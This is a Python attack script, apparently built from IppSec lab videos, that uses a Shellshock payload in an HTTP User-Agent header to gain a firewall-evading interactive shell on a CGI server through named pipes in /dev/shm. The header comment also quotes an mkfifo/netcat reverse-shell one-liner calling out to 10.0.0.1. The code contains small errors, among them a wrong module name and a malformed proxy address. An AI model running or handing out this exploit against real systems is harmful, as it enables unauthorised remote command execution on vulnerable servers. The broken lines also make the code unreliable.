#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This is a webshell obtained from Ippsecs videos that is used to bypass firewalls potentially blocking all other reverse shells.
# Uses HTTP for shell and does the file read and write trick for shell like below.
# Based off this reverse shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
# https://www.youtube.com/watch?v=uMwcJQcUnmY&list=WL&index=4&t=1270s
# https://youtu.be/k6ri-LFWEj4

# Adjust the payload to where we can get command execution, like in a HTTP request header.

import base64
import random
import request
import threading
import time

class WebShell(object):

    # Initilize Class + Setup Shell
    def __init__(self, interval=1.3, proxies='http://127.0.0.1:8080'):
        # Adjust this IP to target IP and URL to remote code execution
        # This example uses shellshock vuln.
        self.url = r"http://10.10.10.56/cgi-bin/cat"
        self.proxies = {'http' : proxies}
        session = random.randrange(10000,99999)
        print(f"[*] Session ID: {session}")
        self.stdin = f'/dev/shm/input.{session}'
        self.stdout = f'/dev/shm/output.{session}'
        self.interval = interval

        # set up shell
        print(f'[*] Setting up fifo shell on target')
        MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
        self.RunRawCMD(MakeNamedPipes, timeout=0.1)

        # set up read thread
        print("[*] Setting up read thread")
        self.interval = interval
        thread = threading.Thread(target=self.ReadThread, args=())
        thread.daemon = True
        thread.start()

    # Read $session, output text to screen & wipe session
    def ReadThread(self):
        GetOutput = f"/bin/cat {self.stdout}"
        while True:
            result = self.RunRawCMD(GetOutput) #, proxy = None)
            if result:
                print(result)
                ClearOutput = f'echo -n "" > {self.stdout}'
                self.RunRawCMD(ClearOutput)
            time.sleep(self.interval)

    # Execute Command.
    def RunRawCMD(self, cmd, timeout=50, proxy="http://127.;0.0.1:8080"):
        #print(f"Going to run cmd: {cmd})
        # Replace the payload here with what allows us to execute code remotely
        payload = """() { :; }; echo "Content-Type: text/html; echo;"""
        payload += """export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin;"""
        payload += cmd

        if proxy:
            proxies = self.proxies
        else:
            proxies = {}

        headers = {'User-Agent': payload}
        try:
            r = request.get(self.url, headers=headers, proxies=proxies, timeout=timeout)
            return r.text
        except:
            pass

    # Send b64'd command to RunRawCommand
    def WriteCmd(self, cmd):
        b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
        stage_cmd = f'echo {b64cmd} | base64 -d > {self.stdin}'
        self.RunRawCMD(stage_cmd)
        time.sleep(self.interval * 1.1)

    def UpgradeShell(self):
        # upgrade shell to fully interactive using python technique
        UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
        self.WriteCmd(UpgradeShell)

prompt = "Command> "
S = WebShell()
while True:
    cmd = input(prompt)
    if cmd == "upgrade":
        prompt = ""
        S.UpgradeShell()
    else:
        S.WriteCmd(cmd)
